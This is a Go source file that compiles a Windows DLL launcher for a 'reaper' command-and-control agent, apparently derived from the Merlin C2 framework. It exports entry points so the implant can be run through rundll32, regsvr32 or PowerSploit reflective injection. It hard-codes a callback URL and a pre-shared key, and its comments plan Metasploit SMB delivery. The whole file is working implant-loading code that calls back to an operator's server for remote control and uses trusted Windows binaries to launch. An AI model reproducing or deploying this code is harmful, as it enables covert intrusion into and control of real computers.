// +build windows,cgo

package main

import (
	"C"
	"os"
	"strings"

	// reaper
	"github.com/infosechoudini/reaper/pkg/agent"
)

var url = "https://127.0.0.1:443"
var psk = "reaper"
var proxy = ""
var host = ""

func main() {}

// run is a private function called by exported functions to instantiate/execute the Agent
func run(URL string) {
	a, err := agent.New("h2", URL, host, psk, proxy, false, false)
	if err != nil {
		os.Exit(1)
	}
	errRun := a.Run()
	if errRun != nil {
		os.Exit(1)
	}
}

// EXPORTED FUNCTIONS

//export Run
// Run is designed to work with rundll32.exe to execute a reaper agent.
// The function will process the command line arguments in spot 3 for an optional URL to connect to
func Run() {
	// If using rundll32 spot 0 is "rundll32", spot 1 is "reaper.dll,Run"
	if len(os.Args) >= 3 {
		if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
			url = os.Args[2]
		}
	}
	run(url)
}

//export VoidFunc
// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
func VoidFunc() { run(url) }

//export DllInstall
// DllInstall is used when executing the reaper agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i reaper.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
// TODO add support for passing reaper server URL with /i:"https://192.168.1.100:443" reaper.dll
func DllInstall() { run(url) }

//export DllRegisterServer
// DLLRegisterServer is used when executing the reaper agent with regsvr32.exe (i.e. regsvr32.exe /s reaper.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
func DllRegisterServer() { run(url) }

//export DllUnregisterServer
// DLLUnregisterServer is used when executing the reaper agent with regsvr32.exe (i.e. regsvr32.exe /s /u reaper.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
func DllUnregisterServer() { run(url) }

//export reaper
// reaper is an exported function that takes in a C *char, converts it to a string, and executes it.
// Intended to be used with DLL loading
func reaper(u *C.char) {
	if len(C.GoString(u)) > 0 {
		url = C.GoString(u)
	}
	run(url)
}

// TODO add entry point of 0 (yes a zero) for use with Metasploit's windows/smb/smb_delivery
// TODO move exported functions to reaper.c to handle them properly and only export Run()
